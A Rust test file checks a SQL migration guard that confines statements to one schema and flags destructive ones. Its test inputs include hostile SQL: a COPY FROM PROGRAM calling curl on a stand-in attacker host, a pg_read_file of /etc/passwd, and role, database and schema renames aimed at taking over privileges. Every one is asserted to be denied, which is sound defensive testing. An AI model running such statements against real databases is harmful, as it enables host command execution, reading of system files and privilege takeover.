//! Focused public-API smoke tests for the extracted `zero-migrate-guard` crate.
//!
//! The exhaustive guard behaviour-lock suite (Platform/Trusted widening, vendor
//! lowering, the data-security IR gate) lives in the engine crate, because those
//! scenarios drive the guard THROUGH the engine's `render::lower` / `conn` apply
//! pipeline (which this leaf crate deliberately cannot depend on). These smoke
//! tests pin the guard's own public surface: the confined deny-list, the
//! cross-schema confinement, the string-literal extractor, and the analysis
//! re-exports.

mod support;

use zero_migrate_guard::guard::{
    check_raw_view_body_text, extract_string_literals, GuardConfig, GuardError, GuardMode, SqlGuard,
};
use zero_migrate_ir::dialect::SqlDialect;
use zero_migrate_ir::policy::SchemaScope;

fn confined() -> SqlGuard {
    SqlGuard::new(GuardConfig::from_policy(
        support::no_inject("app1"),
        SqlDialect::Postgres,
    ))
}

#[test]
fn explicit_confined_charter_fixture_composes() {
    let cfg = GuardConfig::from_policy(support::confined_charter(), SqlDialect::Postgres);
    assert_eq!(
        cfg.schema_scope(),
        Some(SchemaScope::Single("app".to_string()))
    );
}

#[test]
fn dialect_selection_preserves_policy_and_enforces_non_postgres_guard() {
    let cfg = GuardConfig::from_policy_with_mode(
        support::no_inject("app1"),
        SqlDialect::Postgres,
        GuardMode::Off,
    );

    let postgres = cfg.clone().for_dialect(SqlDialect::Postgres);
    assert_eq!(postgres.guard_mode(), GuardMode::Off);
    assert_eq!(
        postgres.schema_scope(),
        Some(SchemaScope::Single("app1".to_string()))
    );

    let sqlite = cfg.for_dialect(SqlDialect::Sqlite);
    assert_eq!(sqlite.guard_mode(), GuardMode::Enforced);
    assert_eq!(
        sqlite.schema_scope(),
        Some(SchemaScope::Single("app1".to_string()))
    );
}

#[test]
fn raw_view_scanner_evaluates_schema_scope_without_a_policy_fixture() {
    let scope = SchemaScope::Single("app1".to_string());
    check_raw_view_body_text("SELECT * FROM app1.widgets", "view body", Some(&scope))
        .expect("the explicit scope admits its own schema");

    let err = check_raw_view_body_text("SELECT * FROM other.widgets", "view body", Some(&scope))
        .expect_err("the explicit scope rejects another schema");
    assert!(matches!(err, GuardError::CrossSchema { .. }));

    let err = check_raw_view_body_text("SELECT pg_read_file('/etc/passwd')", "view body", None)
        .expect_err("the body deny-list remains active without schema confinement");
    assert!(matches!(err, GuardError::Denied { .. }));
}

#[test]
fn confined_allows_a_plain_create_table() {
    let report = confined()
        .check("CREATE TABLE app1.widgets (id int)")
        .expect("a plain confined-schema CREATE TABLE must pass the guard");
    assert!(!report.destructive, "CREATE TABLE is not destructive");
}

#[test]
fn confined_denies_a_copy_program_rce() {
    // `COPY ... FROM PROGRAM` is arbitrary host command execution — the deny-list
    // must reject it under the confined (creator/AI) posture.
    let err = confined()
        .check("COPY app1.t FROM PROGRAM 'curl evil.example'")
        .expect_err("COPY FROM PROGRAM is RCE and must be denied");
    assert!(
        matches!(err, GuardError::Denied { .. }),
        "expected a hard Denied, got {err:?}"
    );
}

#[test]
fn confined_flags_a_drop_table_as_destructive() {
    let report = confined()
        .check("DROP TABLE app1.widgets")
        .expect("DROP TABLE is reversible-structure destructive, not denied outright");
    assert!(report.destructive, "DROP TABLE must be flagged destructive");
}

#[test]
fn confined_denies_a_cross_schema_reference() {
    let err = confined()
        .check("CREATE TABLE other_tenant.secrets (id int)")
        .expect_err("a non-confined schema reference is a cross-tenant violation");
    assert!(
        matches!(
            err,
            GuardError::CrossSchema { .. } | GuardError::Denied { .. }
        ),
        "expected a cross-schema/deny error, got {err:?}"
    );
}

#[test]
fn extract_string_literals_is_multibyte_faithful() {
    let lits = extract_string_literals("SELECT 'héllo', 'wörld'");
    assert_eq!(lits, vec!["héllo".to_string(), "wörld".to_string()]);
}

#[test]
fn non_ascii_relation_name_reaches_a_verdict_instead_of_panicking() {
    // The `pg_` catalog-prefix test byte-sliced `relname[..3]` behind a byte-length
    // check, so an identifier whose third byte fell inside a multi-byte character
    // aborted the process before any allow/deny decision. A guard that panics on
    // untrusted input fails open by taking the caller down with it, so every
    // well-formed UTF-8 identifier must produce a verdict.
    let guard = confined();
    for sql in [
        r#"SELECT * FROM "abé""#,
        r#"SELECT * FROM "a日本""#,
        r#"INSERT INTO "abé" VALUES (1)"#,
        r#"CREATE TABLE app1."abé" (x int)"#,
        r#"SELECT 1; SELECT * FROM "abé""#,
    ] {
        let _ = guard.check(sql);
    }
}

#[test]
fn analysis_reexports_are_reachable() {
    // The engine re-exports these through the guard crate; assert they resolve.
    let advisories = zero_migrate_guard::analyze::analyze("CREATE INDEX i ON app1.t (a)");
    let _ = advisories; // shape-only: analysis never denies.
    let classified = zero_migrate_guard::classify::classify("SELECT 1");
    assert!(
        classified.is_ok(),
        "a plain SELECT must classify without a parse error"
    );
}

#[test]
fn renaming_a_role_database_or_foreign_schema_is_denied() {
    // `RenameStmt` is one node for `ALTER <anything> RENAME TO`, and role, database,
    // and schema renames carry their target in scalar slots the cross-schema walk
    // never visits. Reaching a verdict only for TABLE and COLUMN let a rename confer
    // exactly what the other spellings hard-deny.
    let g = confined();
    for sql in [
        "ALTER ROLE postgres RENAME TO pwned",
        "ALTER USER app1 RENAME TO postgres",
        "ALTER DATABASE postgres RENAME TO pwned",
        // Renaming a schema you do not own takes it away.
        "ALTER SCHEMA control RENAME TO app_stolen",
        // Renaming your own onto a name you do not own claims that one.
        "ALTER SCHEMA app1 RENAME TO control",
    ] {
        let err = g
            .check(sql)
            .expect_err(&format!("must not be admitted: {sql}"));
        assert!(
            matches!(
                err,
                GuardError::Denied { .. } | GuardError::CrossSchema { .. }
            ),
            "expected a deny/cross-schema verdict for `{sql}`, got {err:?}"
        );
    }

    // A rename that names its target through `relation` was already covered, and a
    // table rename inside the owned schema must still pass.
    g.check("ALTER TABLE app1.widgets RENAME TO gadgets")
        .expect("an owned-schema table rename stays allowed");
}
